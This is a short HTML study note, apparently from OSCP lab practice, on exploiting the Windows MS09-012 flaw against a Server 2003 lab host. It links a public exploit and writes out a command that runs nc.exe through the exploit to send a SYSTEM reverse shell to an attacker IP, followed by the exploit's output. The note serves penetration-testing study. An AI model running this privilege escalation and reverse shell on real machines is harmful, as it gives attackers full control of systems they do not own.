<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MS09-012</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># MS09-012</h1></strong><br /><strong>Examples:</strong><br />• oscp 10.11.1.229 - MAIL<br />   ◇ Windows Server 2003 SP1<br /><br /><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012</a><br /><br />The exploit on github runs a command as SYSTEM.<br />To get a SYSTEM shell, we could run <code>nc.exe</code> to send a reverse shell back to us.<br /><br /><div class="codebox"><div class="codebox">C:\WINDOWS\Temp&gt;pr.exe&nbsp;&quot;C:\WINDOWS\Temp\nc.exe&nbsp;10.11.0.184&nbsp;9002&nbsp;-e&nbsp;cmd.exe&quot;<br />pr.exe&nbsp;&quot;C:\WINDOWS\Temp\nc.exe&nbsp;10.11.0.184&nbsp;9002&nbsp;-e&nbsp;cmd.exe&quot;<br />/xxoo/--&gt;Build&amp;&amp;Change&nbsp;By&nbsp;p&nbsp;<br />/xxoo/--&gt;This&nbsp;exploit&nbsp;gives&nbsp;you&nbsp;a&nbsp;Local&nbsp;System&nbsp;shell&nbsp;<br />/xxoo/--&gt;Got&nbsp;WMI&nbsp;process&nbsp;Pid:&nbsp;216&nbsp;<br />begin&nbsp;to&nbsp;try<br />/xxoo/--&gt;Found&nbsp;token&nbsp;SYSTEM&nbsp;<br />/xxoo/--&gt;Command:C:\WINDOWS\Temp\nc.exe&nbsp;10.11.0.184&nbsp;9002&nbsp;-e&nbsp;cmd.exe</div></div></div>
</body>
</html>
